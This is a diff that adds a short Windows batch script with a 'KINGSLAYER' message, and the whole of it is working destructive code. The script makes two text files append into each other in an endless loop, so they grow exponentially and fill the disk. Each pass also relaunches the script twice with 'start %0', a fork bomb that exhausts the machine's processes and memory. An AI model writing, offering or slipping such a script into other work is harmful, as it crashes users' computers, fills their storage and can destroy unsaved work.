@@ -1,0 +1,8 @@
+echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer1.txt
+echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer2.txt
+:slay
+type kingslayer1.txt >> kingslayer2.txt
+type kingslayer2.txt >> kingslayer1.txt
+start %0 
+start %0
+goto slay
